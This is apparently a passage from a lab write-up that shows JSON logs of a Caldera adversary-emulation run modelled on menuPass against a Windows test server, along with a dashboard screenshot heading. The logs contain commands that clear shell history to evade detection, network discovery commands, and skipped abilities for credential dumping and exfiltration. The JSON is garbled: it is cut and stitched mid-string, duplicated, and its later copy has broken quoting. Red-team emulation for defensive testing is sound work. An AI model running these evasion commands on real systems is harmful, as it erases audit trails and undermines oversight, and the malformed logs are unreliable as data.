                        "name":"sh",
                        "platform":"linux",
                        "command":"> $HOME/.bash_history && unset HISTFILE",
                        "code":null,
                        "language":null,
                        "build_target":null,
                        "payloads":[
                           
                        ],
                        "uploads":[
                           
                        ],
                        "timeout":60,
                        "parsers":[
                           
                        ],
                        "cleanup":[
                           
                        ],
                        "variations":[
                           
                        ],
                        "additional_info":{
                           
                        }
                     },
                     {
                        "name":"psh",
                        "platform":"windows",
                        "command":"Clear-History;Clear",
                        "code":null,
                        "language":null,
                        "build_target":null,
                        "payloads":[
                           
                        ],
                        "uploads":[
                           
                        ],
                        "timeout":60,
                        "parsers":[
                           
                        ],
                        "cleanup":[
                           
                        ],
                        "variations":[
                           
                        ],
                        "additional_info":{
                           
                        }
                     }
                  ],
                  "requirements":[
                     
                  ],
                  "privilege":null,
                  "repeatable":false,
                  "buckets":[
                     "defense-evasion"
                  ],
                  "additional_info":{
                     
                  },
                  "access":{
                     
                  },
                  "singleton":false,
                  "plugin":"stockpile",
                  "delete_payload":true
               },
               "executor":{
                  "name":"psh",
                  "platform":"windows",
                  "command":"Clear-History;Clear",
                  "code":null,
                  "language":null,
                  "build_target":null,
                  "payloads":[
                     
                  ],
                  "uploads":[
                     
                  ],
                  "timeout":60,
                  "parsers":[
                     
                  ],
                  "cleanup":[
                     
                  ],
                  "variations":[
                     
                  ],
                  "additional_info":{
                     
                  }
               },
               "cleanup":0,
               "visibility":{
                  "score":50,
                  "adjustments":[
                     
                  ]
               },
               "host":"windows-server",
               "output":"False",
               "deadman":false,
               "agent_reported_time":"2024-11-12T08:03:32Z"
            }
         ],
         "pending_contact":"HTTP"
      }
   ],
   "start":"2024-11-12T09:07:24Z",
   "steps":{
      "tjsiii":{
         "steps":[
            {
               "link_id":"f288566f-8b48-4948-a44f-c097af531bb9",
               "ability_id":"7877ec4d-3c11-40f2-9650-35261e4ac879",
               "command":"net use",
               "plaintext_command":"net use",
               "delegated":"2024-11-12T09:07:24Z",
               "run":"2024-11-12T09:08:12Z",
               "status":0,
               "platform":"windows",
               "executor":"cmd",
               "pid":6288,
               "description":"Display network shares",
               "name":"Network Share Discovery",
               "attack":{
                  "tactic":"discovery",
                  "technique_name":"Network Share Discovery",
                  "technique_id":"T1135"
               },
               "output":{
                  "stdout":"New connections will be remembered.There are no entries in the list.",
                  "stderr":"",
                  "exit_code":"0"
               },
               "agent_reported_time":"2024-11-12T09:08:11Z"
            },
            {
               "link_id":"54f82d0f-b338-4762-8e6d-36763ef1baec",
               "ability_id":"e132a235-fe43-45c2-a334-2f235a7646b5",
               "command":"net view /domain",
               "plaintext_command":"net view /domain",
               "delegated":"2024-11-12T09:08:14Z",
               "run":"2024-11-12T09:09:01Z",
               "status":1,
               "platform":"windows",
               "executor":"cmd",
               "pid":2848,
               "description":"Identify remote systems using net",
               "name":"Remote System Discovery",
               "attack":{
                  "tactic":"discovery",
                  "technique_name":"Remote System Discovery",
                  "technique_id":"T1018"
               },
               "output":{
                  "stdout":"",
                  "stderr":"System error 6118 has occurred.The list of servers for this workgroup is not currently available",
                  "exit_code":"2"
               },
               "agent_reported_time":"2024-11-12T09:08:48Z"
            }{
               "name":"Test-menuPass",
               "host_group":[
                  {
                     "paw":"tjsiii",
                     "sleep_min":30,
                     "sleep_max":60,
                     "watchdog":0,
                     "group":"red",
                     "architecture":"amd64",
                     "platform":"windows",
                     "server":"http://192.168.2.13:8888",
                     "upstream_dest":"http://192.168.2.13:8888",
                     "username":"WINDOWS-SERVER\\Administrator",
                     "location":"C:\\Users\\Public\\caldera-read-team-agent.exe",
                     "pid":1592,
                     "ppid":2180,
                     "trusted":true,
                     "executors":[
                        "proc",
                        "cmd",
                        "psh"
                     ],
                     "privilege":"Elevated",
                     "exe_name":"caldera-read-team-agent.exe",
                     "host":"windows-server",
                     "contact":"HTTP",
                     "proxy_receivers":{
                        
                     },
                     "proxy_chain":[
                        
                     ],
                     "origin_link_id":"",
                     "deadman_enabled":true,
                     "available_contacts":[
                        "HTTP"
                     ],
                     "host_ip_addrs":[
                        "192.168.1.21"
                     ],
                     "display_name":"windows-server$WINDOWS-SERVER\\Administrator",
                     "created":"2024-11-12T08:03:33Z",
                     "last_seen":"2024-11-12T09:40:47Z",
                     "links":[
                        {
                           "id":"e7bb5885-5899-474a-94ed-d1a021db12f3",
                           "paw":"tjsiii",
                           "command":"Q2xlYXItSGlzdG9yeTtDbGVhcg==",
                           "plaintext_command":"Q2xlYXItSGlzdG9yeTtDbGVhcg==",
                           "status":0,
                           "score":0,
                           "jitter":0,
                           "decide":"2024-11-12T08:03:33Z",
                           "pin":0,
                           "pid":"1384",
                           "facts":[
                              
                           ],
                           "relationships":[
                              
                           ],
                           "used":[
                              
                           ],
                           "unique":"e7bb5885-5899-474a-94ed-d1a021db12f3",
                           "collect":"2024-11-12T08:03:33Z",
                           "finish":"2024-11-12T08:03:33Z",
                           "ability":{
                              "ability_id":"43b3754c-def4-4699-a673-1d85648fda6a",
                              "tactic":"defense-evasion",
                              "technique_name":"Indicator Removal on Host: Clear Command History",
                              "technique_id":"T1070.003",
                              "name":"Avoid logs",
                              "description":"Stop terminal from logging history",
                              "executors":[
                                 {
                                    "name":"sh",
                                    "platform":"darwin",
                                    "command":"> $HOME/.bash_history && unset HISTFILE",
                                    "code":null,
                                    "language":null,
                                    "build_target":null,
                                    "payloads":[
                                       
                                    ],
                                    "uploads":[
                                       
                                    ],
                                    "timeout":60,
                                    "parsers":[
                                       
                                    ],
                                    "cleanup":[
                                       
                                    ],
                                    "variations":[
                                       
                                    ],
                                    "additional_info":{
                                       
                                    }
                                 },
                                 {
                                    "name":"sh",
                                    "platform":"linux",
                                    "command":"> $HOME/.bash_history && unset HISTFILE",
                                    "code":null,
                                    "language":null,
                                    "build_target":null,
                                    "payloads":[
                                       
                                    ],
                                    "uploads":[
                                       
                                    ],
                                    "timeout":60,
                                    "parsers":[
                                       
                                    ],
                                    "cleanup":[
                                       
                                    ],
                                    "variations":[
                                       
                                    ],
                                    "additional_info":{
                                       
                                    }
                                 },
                                 {
                                    "name":"psh",
                                    "platform":"windows",
                                    "command":"Clear-History;Clear",
                                    "code":null,
                                    "language":null,
                                    "build_target":null,
                                    "payloads":[
                                       
                                    ],
                                    "uploads":[
                                       
                                    ],
                                    "timeout":60,
                                    "parsers":[
                                       
                                    ],
                                    "cleanup":[
                                       
                                    ],
                                    "variations":[
                                       
                                    ],
                                    "additional_info":{
                                       
                                    }
                                 }
                              ],
                              "requirements":[
                                 
                              ],
                              "privilege":null,
                              "repeatable":false,
                              "buckets":[
                                 "defense-evasion"
                              ],
                              "additional_info":{
                                 
                              },
                              "access":{
                                 
                              },
                              "singleton":false,
                              "plugin":"stockpile",
                              "delete_payload":true
                           },
                           "executor":{
                              "name":"psh",
                              "platform":"windows",
                              "command":"Clear-History;Clear",
                              "code":null,
                              "language":null,
                              "build_target":null,
                              "payloads":[
                                 
                              ],
                              "uploads":[
                                 
                              ],
                              "timeout":60,
                              "parsers":[
                                 
                              ],
                              "cleanup":[
                                 
                              ],
                              "variations":[
                                 
                              ],
                              "additional_info":{
                                 
                              }
                           },
                           "cleanup":0,
                           "visibility":{
                              "score":50,
                              "adjustments":[
                                 
                              ]
                           },
                           "host":"windows-server",
                           "output":"False",
                           "deadman":false,
                           "agent_reported_time":"2024-11-12T08:03:32Z"
                        }
                     ],
                     "pending_contact":"HTTP"
                  }
               ],
               "start":"2024-11-12T09:07:24Z",
               "steps":{
                  "tjsiii":{
                     "steps":[
                        {
                           "link_id":"f288566f-8b48-4948-a44f-c097af531bb9",
                           "ability_id":"7877ec4d-3c11-40f2-9650-35261e4ac879",
                           "command":"net use",
                           "plaintext_command":"net use",
                           "delegated":"2024-11-12T09:07:24Z",
                           "run":"2024-11-12T09:08:12Z",
                           "status":0,
                           "platform":"windows",
                           "executor":"cmd",
                           "pid":6288,
                           "description":"Display network shares",
                           "name":"Network Share Discovery",
                           "attack":{
                              "tactic":"discovery",
                              "technique_name":"Network Share Discovery",
                              "technique_id":"T1135"
                           },
                           "output":{
                              "stdout":"New connections will be remembered.There are no entries in the list.",
                              "stderr":"",
                              "exit_code":"0"
                           },
                           "agent_reported_time":"2024-11-12T09:08:11Z"
                        },
                        {
                           "link_id":"54f82d0f-b338-4762-8e6d-36763ef1baec",
                           "ability_id":"e132a235-fe43-45c2-a334-2f235a7646b5",
                           "command":"net view /domain",
                           "plaintext_command":"net view /domain",
                           "delegated":"2024-11-12T09:08:14Z",
                           "run":"2024-11-12T09:09:01Z",
                           "status":1,
                           "platform":"windows",
                           "executor":"cmd",
                           "pid":2848,
                           "description":"Identify remote systems using net",
                           "name":"Remote System Discovery",
                           "attack":{
                              "tactic":"discovery",
                              "technique_name":"Remote System Discovery",
                              "technique_id":"T1018"
                           },
                           "output":{
                              "stdout":"",
                              "stderr":"System error 6118 has occurred.The list of servers for this workgroup is not currently available",
                              "exit_code":"2"
                           },
                           "agent_reported_time":"2024-11-12T09:08:48Z"
                        }
                     ]
                  }
               },
               "finish":"2024-11-12T09:40:35Z",
               "planner":"atomic",
               "adversary":{
                  "adversary_id":"b5192070-dff1-4134-bf66-c6b87c7498af",
                  "name":"menuPass",
                  "description":"menuPass is thought to be a Chinese cyber espionage group associated with activity directed by elements of the PRC MSS. (Emu)",
                  "atomic_ordering":[
                     "a750b196-8168-461a-8747-bdc4add107ac",
                     "7877ec4d-3c11-40f2-9650-35261e4ac879",
                     "e132a235-fe43-45c2-a334-2f235a7646b5",
                     "d19678ac-3bca-475e-89d4-f452bfc2cc2a",
                     "b6026408-c815-47ca-bbb0-6b74591badc8",
                     "814005f7-c8d3-45c8-aea2-45758b2d6e90",
                     "9d543214-6476-429a-9ca1-cf12233b808c",
                     "ffb50e17-cb3c-4424-a4e7-99e3885f22cc",
                     "fe3d4de1-50bf-4241-9546-72dc757e696f",
                     "4b1748e5-532c-453c-b195-557ce5550fef",
                     "160a1e0f-0f9b-49bb-a0fe-7e362b51737f",
                     "b4fa6d2e-ed9c-4a86-81aa-19331983fe0d",
                     "ea4bc858-ba13-4f97-9df3-c543d8f3d44c",
                     "8911d502-747a-4155-adcd-b03a1f284ee7",
                     "236d1357-64f9-4a98-afc1-bccaa89aba8c"
                  ],
                  "objective":"495a9828-cab1-44dd-a0ca-66e58177d8cc",
                  "tags":[
                     
                  ],
                  "has_repeatable_abilities":false,
                  "plugin":"emu"
               },
               "jitter":"2/8",
               "objectives":{
                  "id":"495a9828-cab1-44dd-a0ca-66e58177d8cc",
                  "name":"default",
                  "description":"This is a default objective that runs forever.",
                  "goals":[
                     {
                        "target":"exhaustion",
                        "value":"complete",
                        "count":1048576,
                        "operator":"==",
                        "achieved":false
                     }
                  ],
                  "percentage":0
               },
               "facts":[
                  {
                     "unique":"file.sensitive.extensionwav",
                     "trait":"file.sensitive.extension",
                     "name":"file.sensitive.extension",
                     "value":"wav",
                     "created":"2024-11-09T07:37:21Z",
                     "score":1,
                     "source":"ed32b9c3-9593-4c33-b0db-e2007315096b",
                     "origin_type":"IMPORTED",
                     "links":[
                        
                     ],
                     "relationships":[
                        
                     ],
                     "limit_count":-1,
                     "collected_by":[
                        
                     ],
                     "technique_id":""
                  },
                  {
                     "unique":"file.sensitive.extensionyml",
                     "trait":"file.sensitive.extension",
                     "name":"file.sensitive.extension",
                     "value":"yml",
                     "created":"2024-11-09T07:37:21Z",
                     "score":1,
                     "source":"ed32b9c3-9593-4c33-b0db-e2007315096b",
                     "origin_type":"IMPORTED",
                     "links":[
                        
                     ],
                     "relationships":[
                        
                     ],
                     "limit_count":-1,
                     "collected_by":[
                        
                     ],
                     "technique_id":""
                  },
                  {
                     "unique":"file.sensitive.extensionpng",
                     "trait":"file.sensitive.extension",
                     "name":"file.sensitive.extension",
                     "value":"png",
                     "created":"2024-11-09T07:37:21Z",
                     "score":1,
                     "source":"ed32b9c3-9593-4c33-b0db-e2007315096b",
                     "origin_type":"IMPORTED",
                     "links":[
                        
                     ],
                     "relationships":[
                        
                     ],
                     "limit_count":-1,
                     "collected_by":[
                        
                     ],
                     "technique_id":""
                  },
                  {
                     "unique":"server.malicious.urlkeyloggedsite.com",
                     "trait":"server.malicious.url",
                     "name":"server.malicious.url",
                     "value":"keyloggedsite.com",
                     "created":"2024-11-09T07:37:21Z",
                     "score":1,
                     "source":"ed32b9c3-9593-4c33-b0db-e2007315096b",
                     "origin_type":"IMPORTED",
                     "links":[
                        
                     ],
                     "relationships":[
                        
                     ],
                     "limit_count":-1,
                     "collected_by":[
                        
                     ],
                     "technique_id":""
                  }
               ],
               "skipped_abilities":[
                  {
                     "tjsiii":[
                        {
                           "reason":"Fact dependency not fulfilled",
                           "reason_id":3,
                           "ability_id":"a750b196-8168-461a-8747-bdc4add107ac",
                           "ability_name":"Ingress Tool Transfer"
                        },
                        {
                           "reason":"Fact dependency not fulfilled",
                           "reason_id":3,
                           "ability_id":"d19678ac-3bca-475e-89d4-f452bfc2cc2a",
                           "ability_name":"Remote System Discovery"
                        },
                        {
                           "reason":"Fact dependency not fulfilled",
                           "reason_id":3,
                           "ability_id":"b6026408-c815-47ca-bbb0-6b74591badc8",
                           "ability_name":"Network Service Scanning"
                        },
                        {
                           "reason":"Fact dependency not fulfilled",
                           "reason_id":3,
                           "ability_id":"814005f7-c8d3-45c8-aea2-45758b2d6e90",
                           "ability_name":"System Network Configuration Discovery"
                        },
                        {
                           "reason":"Fact dependency not fulfilled",
                           "reason_id":3,
                           "ability_id":"9d543214-6476-429a-9ca1-cf12233b808c",
                           "ability_name":"System Network Configuration Discovery"
                        },
                        {
                           "reason":"Fact dependency not fulfilled",
                           "reason_id":3,
                           "ability_id":"ffb50e17-cb3c-4424-a4e7-99e3885f22cc",
                           "ability_name":"OS Credential Dumping"
                        },
                        {
                           "reason":"Fact dependency not fulfilled",
                           "reason_id":3,
                           "ability_id":"fe3d4de1-50bf-4241-9546-72dc757e696f",
                           "ability_name":"OS Credential Dumping"
                        },
                        {
                           "reason":"Fact dependency not fulfilled",
                           "reason_id":3,
                           "ability_id":"4b1748e5-532c-453c-b195-557ce5550fef",
                           "ability_name":"Service Execution"
                        },
                        {
                           "reason":"Fact dependency not fulfilled",
                           "reason_id":3,
                           "ability_id":"160a1e0f-0f9b-49bb-a0fe-7e362b51737f",
                           "ability_name":"Archive Collected Data - Archive via Utility"
                        },
                        {
                           "reason":"Fact dependency not fulfilled",
                           "reason_id":3,
                           "ability_id":"b4{""name"":""Test-menuPass"",""host_group"":[{""paw"":""tjsiii"",""sleep_min"":30,""sleep_max"":60,""watchdog"":0,""group"":""red"",""architecture"":"amd64",""platform"":""windows"",""server"":""http"::8888",""upstream_dest"":""http"::8888",""username"":""WINDOWS-SERVER\\Administrator"",""location"":""C":"\\Users\\Public\\caldera-read-team-agent.exe"",""pid"":1592,""ppid"":2180,""trusted"":true,""executors"":[""proc"",""cmd"",""psh""],""privilege"":""Elevated"",""exe_name"":""caldera-read-team-agent.exe"",""host"":""windows-server"",""contact"":""HTTP"",""proxy_receivers"":{},""proxy_chain"":[],""origin_link_id"":"",""deadman_enabled"":true,""available_contacts"":[""HTTP""],""host_ip_addrs"":["192.168.1.21"],""display_name"":""windows-server$WINDOWS-SERVER\\Administrator"",""created"":""2024-11-12T08":"03":33Z",""last_seen"":""2024-11-12T09":"40":47Z",""links"":[{""id"":"e7bb5885-5899-474a-94ed-d1a021db12f3",""paw"":""tjsiii"",""command"":"Q2xlYXItSGlzdG9yeTtDbGVhcg==",""plaintext_command"":"Q2xlYXItSGlzdG9yeTtDbGVhcg==",""status"":0,""score"":0,""jitter"":0,""decide"":""2024-11-12T08":"03":33Z",""pin"":0,""pid"":"1384",""facts"":[],""relationships"":[],""used"":[],""unique"":"e7bb5885-5899-474a-94ed-d1a021db12f3",""collect"":""2024-11-12T08":"03":33Z",""finish"":""2024-11-12T08":"03":33Z",""ability"":{""ability_id"":"43b3754c-def4-4699-a673-1d85648fda6a",""tactic"":""defense-evasion"",""technique_name"":""Indicator Removal on Host":"Clear Command History"",""technique_id"":"T1070.003",""name"":""Avoid logs"",""description"":""Stop terminal from logging history"",""executors"":[{""name"":""sh"",""platform"":""darwin"",""command"":""> $HOME/.bash_history && unset HISTFILE"",""code"":null,""language"":null,""build_target"":null,""payloads"":[],""uploads"":[],""timeout"":60,""parsers"":[],""cleanup"":[],""variations"":[],""additional_info"":{}},{""name"":""sh"",""platform"":""linux"",""command"":""> $HOME/.bash_history && unset HISTFILE"",""code"":null,""language"":null,""build_target"":null,""payloads"":[],""uploads"":[],""timeout"":60,""parsers"":[],""cleanup"":[],""variations"":[],""additional_info"":{}},{""name"":""psh"",""platform"":""windows"",""command"":""Clear-History;Clear"",""code"":null,""language"":null,""build_target"":null,""payloads"":[],""uploads"":[],""timeout"":60,""parsers"":[],""cleanup"":[],""variations"":[],""additional_info"":{}}],""requirements"":[],""privilege"":null,""repeatable"":false,""buckets"":[""defense-evasion""],""additional_info"":{},""access"":{},""singleton"":false,""plugin"":""stockpile"",""delete_payload"":true},""executor"":{""name"":""psh"",""platform"":""windows"",""command"":""Clear-History;Clear"",""code"":null,""language"":null,""build_target"":null,""payloads"":[],""uploads"":[],""timeout"":60,""parsers"":[],""cleanup"":[],""variations"":[],""additional_info"":{}},""cleanup"":0,""visibility"":{""score"":50,""adjustments"":[]},""host"":""windows-server"",""output"":"false",""deadman"":false,""agent_reported_time"":""2024-11-12T08":"03":32Z"}],""pending_contact"":""HTTP""}],""start"":""2024-11-12T09":"07":24Z",""steps"":{""tjsiii"":{""steps"":[{""link_id"":"f288566f-8b48-4948-a44f-c097af531bb9",""ability_id"":"7877ec4d-3c11-40f2-9650-35261e4ac879",""command"":""net use"",""plaintext_command"":""net use"",""delegated"":""2024-11-12T09":"07":24Z",""run"":""2024-11-12T09":"08":12Z",""status"":0,""platform"":""windows"",""executor"":""cmd"",""pid"":6288,""description"":""Display network shares"",""name"":""Network Share Discovery"",""attack"":{""tactic"":""discovery"",""technique_name"":""Network Share Discovery"",""technique_id"":"T1135"},""output"":{""stdout"":""New connections will be remembered.There are no entries in the list."",""stderr"":"",""exit_code"":"0"},""agent_reported_time"":""2024-11-12T09":"08":11Z"},{""link_id"":"54f82d0f-b338-4762-8e6d-36763ef1baec",""ability_id"":"e132a235-fe43-45c2-a334-2f235a7646b5",""command"":""net view /domain"",""plaintext_command"":""net view /domain"",""delegated"":""2024-11-12T09":"08":14Z",""run"":""2024-11-12T09":"09":01Z",""status"":1,""platform"":""windows"",""executor"":""cmd"",""pid"":2848,""description"":""Identify remote systems using net"",""name"":""Remote System Discovery"",""attack"":{""tactic"":""discovery"",""technique_name"":""Remote System Discovery"",""technique_id"":"T1018"},""output"":{""stdout"":"",""stderr"":"System error 6118 has occurred.The list of servers for this workgroup is not currently available",""exit_code"":"2"},""agent_reported_time"":""2024-11-12T09":"08":48Z"}]}},""finish"":""2024-11-12T09":"40":35Z",""planner"":""atomic"",""adversary"":{""adversary_id"":"b5192070-dff1-4134-bf66-c6b87c7498af",""name"":""menuPass"",""description"":""menuPass is thought to be a Chinese cyber espionage group associated with activity directed by elements of the PRC MSS. (Emu)"",""atomic_ordering"":["a750b196-8168-461a-8747-bdc4add107ac","7877ec4d-3c11-40f2-9650-35261e4ac879","e132a235-fe43-45c2-a334-2f235a7646b5","d19678ac-3bca-475e-89d4-f452bfc2cc2a","b6026408-c815-47ca-bbb0-6b74591badc8","814005f7-c8d3-45c8-aea2-45758b2d6e90","9d543214-6476-429a-9ca1-cf12233b808c","ffb50e17-cb3c-4424-a4e7-99e3885f22cc","fe3d4de1-50bf-4241-9546-72dc757e696f","4b1748e5-532c-453c-b195-557ce5550fef","160a1e0f-0f9b-49bb-a0fe-7e362b51737f","b4fa6d2e-ed9c-4a86-81aa-19331983fe0d","ea4bc858-ba13-4f97-9df3-c543d8f3d44c","8911d502-747a-4155-adcd-b03a1f284ee7","236d1357-64f9-4a98-afc1-bccaa89aba8c"],""objective"":"495a9828-cab1-44dd-a0ca-66e58177d8cc",""tags"":[],""has_repeatable_abilities"":false,""plugin"":""emu""},""jitter"":"2/8",""objectives"":{""id"":"495a9828-cab1-44dd-a0ca-66e58177d8cc",""name"":""default"",""description"":""This is a default objective that runs forever."",""goals"":[{""target"":""exhaustion"",""value"":""complete"",""count"":1048576,""operator"":""=="",""achieved"":false}],""percentage"":0},""facts"":[{""unique"":""file.sensitive.extensionwav"",""trait"":""file.sensitive.extension"",""name"":""file.sensitive.extension"",""value"":""wav"",""created"":""2024-11-09T07":"37":21Z",""score"":1,""source"":"ed32b9c3-9593-4c33-b0db-e2007315096b",""origin_type"":""IMPORTED"",""links"":[],""relationships"":[],""limit_count"":-1,""collected_by"":[],""technique_id"":""},{""unique"":""file.sensitive.extensionyml"",""trait"":""file.sensitive.extension"",""name"":""file.sensitive.extension"",""value"":""yml"",""created"":""2024-11-09T07":"37":21Z",""score"":1,""source"":"ed32b9c3-9593-4c33-b0db-e2007315096b",""origin_type"":""IMPORTED"",""links"":[],""relationships"":[],""limit_count"":-1,""collected_by"":[],""technique_id"":""},{""unique"":""file.sensitive.extensionpng"",""trait"":""file.sensitive.extension"",""name"":""file.sensitive.extension"",""value"":""png"",""created"":""2024-11-09T07":"37":21Z",""score"":1,""source"":"ed32b9c3-9593-4c33-b0db-e2007315096b",""origin_type"":""IMPORTED"",""links"":[],""relationships"":[],""limit_count"":-1,""collected_by"":[],""technique_id"":""},{""unique"":""server.malicious.urlkeyloggedsite.com"",""trait"":""server.malicious.url"",""name"":""server.malicious.url"",""value"":""keyloggedsite.com"",""created"":""2024-11-09T07":"37":21Z",""score"":1,""source"":"ed32b9c3-9593-4c33-b0db-e2007315096b",""origin_type"":""IMPORTED"",""links"":[],""relationships"":[],""limit_count"":-1,""collected_by"":[],""technique_id"":""}],""skipped_abilities"":[{""tjsiii"":[{""reason"":""Fact dependency not fulfilled"",""reason_id"":3,""ability_id"":"a750b196-8168-461a-8747-bdc4add107ac",""ability_name"":""Ingress Tool Transfer""},{""reason"":""Fact dependency not fulfilled"",""reason_id"":3,""ability_id"":"d19678ac-3bca-475e-89d4-f452bfc2cc2a",""ability_name"":""Remote System Discovery""},{""reason"":""Fact dependency not fulfilled"",""reason_id"":3,""ability_id"":"b6026408-c815-47ca-bbb0-6b74591badc8",""ability_name"":""Network Service Scanning""},{""reason"":""Fact dependency not fulfilled"",""reason_id"":3,""ability_id"":"814005f7-c8d3-45c8-aea2-45758b2d6e90",""ability_name"":""System Network Configuration Discovery""},{""reason"":""Fact dependency not fulfilled"",""reason_id"":3,""ability_id"":"9d543214-6476-429a-9ca1-cf12233b808c",""ability_name"":""System Network Configuration Discovery""},{""reason"":""Fact dependency not fulfilled"",""reason_id"":3,""ability_id"":"ffb50e17-cb3c-4424-a4e7-99e3885f22cc",""ability_name"":""OS Credential Dumping""},{""reason"":""Fact dependency not fulfilled"",""reason_id"":3,""ability_id"":"fe3d4de1-50bf-4241-9546-72dc757e696f",""ability_name"":""OS Credential Dumping""},{""reason"":""Fact dependency not fulfilled"",""reason_id"":3,""ability_id"":"4b1748e5-532c-453c-b195-557ce5550fef",""ability_name"":""Service Execution""},{""reason"":""Fact dependency not fulfilled"",""reason_id"":3,""ability_id"":"160a1e0f-0f9b-49bb-a0fe-7e362b51737f",""ability_name"":""Archive Collected Data - Archive via Utility""},{""reason"":""Fact dependency not fulfilled"",""reason_id"":3,""ability_id"":"b4fa6d2e-ed9c-4a86-81aa-19331983fe0d",""ability_name"":""Recycle Bin Staging""},{""reason"":""Fact dependency not fulfilled"",""reason_id"":3,""ability_id"":"ea4bc858-ba13-4f97-9df3-c543d8f3d44c",""ability_name"":""Transfer Data to Cloud Account""},{""reason"":""Fact dependency not fulfilled"",""reason_id"":3,""ability_id"":"8911d502-747a-4155-adcd-b03a1f284ee7",""ability_name"":""Windows Management Instrumentation""},{""reason"":""Fact dependency not fulfilled"",""reason_id"":3,""ability_id"":"236d1357-64f9-4a98-afc1-bccaa89aba8c",""ability_name"":""Scheduled Task Persistence""\"}]}]}"
```

## Screenshot Caldera Operation Dashboard

![alt text](/assets/images/test-menupass-operation-dashboard.png)
